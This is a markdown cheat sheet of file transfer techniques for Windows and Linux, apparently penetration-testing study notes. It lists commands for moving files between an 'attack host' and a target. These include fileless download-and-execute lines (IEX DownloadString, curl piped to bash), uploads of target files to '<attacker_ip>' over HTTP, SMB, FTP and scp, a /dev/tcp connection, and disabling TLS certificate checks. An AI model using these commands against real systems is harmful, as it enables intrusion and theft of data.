# File Transfer Methods

## Windows

### Download Files on Target

- Base64 Encode and Decode

```shell
# Attack box
cat filename |base64 -w 0;echo
# Target Windows host
[IO.File]::WriteAllBytes("Output_file", [Convert]::FromBase64String("base64_string"))
```

- PowerShell DownloadFile Method

```shell
# File Download
(New-Object Net.WebClient).DownloadFile('<Target_File_URL>','<Output_file>')
(New-Object Net.WebClient).DownloadFileAsync('<Target_File_URL>','<Output_file>')

# Fileless Download
IEX (New-Object Net.WebClient).DownloadString('<Target_File_URL>')
(New-Object Net.WebClient).DownloadString('<Target_File_URL>') | IEX
Invoke-WebRequest <Target_File_URL> -OutFile <Output_file>

# Response content cannot be parsed because the Internet Explorer
Invoke-WebRequest <Target_File_URL> -UseBasicParsing | IEX
# In case of SSL/TLS error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

- SMB Downloads

```shell
# Create SMB server on attack host
sudo impacket-smbserver <share_name> -smb2support <folder_path>
sudo impacket-smbserver <share_name> -smb2support <folder_path> -user test -password test

# Download file from attacker SMB server
copy \\<attacker_ip>\<share_name>\<filename>
net use n: \\<attacker_ip>\<share_name> /user:test test
```

- FTP Downloads

```shell
# Setup on attack host
python3 -m venv venv
pip3 install pyftpdlib
python3 -m pyftpdlib --port 21

# Download file on target host
(New-Object Net.WebClient).DownloadFile('ftp://<attacker_ip>/<filename>', 'output_file')
```

- Mounting a linux folder on target host using RDP

```shell
# Using rdesktop
rdesktop <target_ip> -d <domain> -u <username> -p <password> -r disk:linux=<folder_path>
# Using xfreerdp
xfreerdp /v:<target_ip> /d:<domain> /u:<username> /p:<password> /drive:linux,<folder_path>
```

### Upload Files to Attack Host

- Base64 Encode and Decode

```shell
# Encode file on target host
[Convert]::ToBase64String((Get-Content -path "<file_path>" -Encoding byte))

# Decode file attack host
echo <base64_string> | base64 -d > output_file
```

- Powershell web uploads

```shell
# Setup web server on attack host
python3 -m venv venv
pip3 install uploadserver
python3 -m uploadserver

# Upload file to web server from powershell
Invoke-FileUpload -Uri <attacker_ip>/upload -File file_path
```

- Base64 Encoded web upload

```shell
# Start listening on attack host
nc -nvlp <port>

# Send base64 string through Powershell 
$b64 = [System.convert]::ToBase64String((Get-Content -Path <file_path> -Encoding Byte))
Invoke-WebRequest -Uri <attacker_ip> -Method POST -Body $b64
```

- SMB Upload

```shell
# Setup SMB server on attack host
python3 -m venv venv
pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# Upload file to SMB share
copy <filepath> \\<attacker_ip>\<share_folder>\
```

- FTP Upload

```shell
# Setup server on attack host
python3 -m venv venv
sudo python3 -m pyftpdlib --port 21 --write

# Upload file on FTP server
(New-Object Net.WebClient).UploadFile('ftp://<attcker_ip>/ftp-hosts', '<filepath>')
```


## Linux

### Download Files on Target

- Base64 Encode and decode

```shell
# Base64 encode
cat <filename> |base64 -w 0;echo
# Base64 decode
echo -n 'base64_string' | base64 -d > output_file
```

- Web Downloads

```shell
# Start web server on Attack host
python3 -m http.server

# Download files
wget <url> -O output_file
curl -o output_file <url>

# Fileless download
curl <url> | bash
wget -qO- <url> | python3
```

- Download with bash

```shell
# Start web server on attack host
python3 -m http.server <port>

# Connect to server
exec 3<>/dev/tcp/<attacker_ip>/<port>
# Send request to download file
echo -e "GET /<filename> HTTP/1.1\n\n">&3
# Write the content in file
cat <&3 > <filename>
```

- SCP Download

```shell
scp <username>@<host_ip>:<file_path> output_file 
```


### Upload Files on Attack Host

- Web Upload

```shell
# Install dependencies on attack host
python3 -m venv venv
python3 -m pip install --user uploadserver
# create self signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# Start web server on attack host
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload file(s) from target
curl -X POST https://<attacker_ip>/upload -F 'files=@file1_path' -F 'files=@file2_path' --insecure
```

- Starting a web server on victim and use curl to download files on attack host

```shell
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

- File Upload using SCP

```shell
# Send files on attack host using scp
scp <file_path> <username>@<attacker_ip>:<output_file>

# Download file on attack host using scp
scp <username>@<target_ip>:<file_path> output_file 
```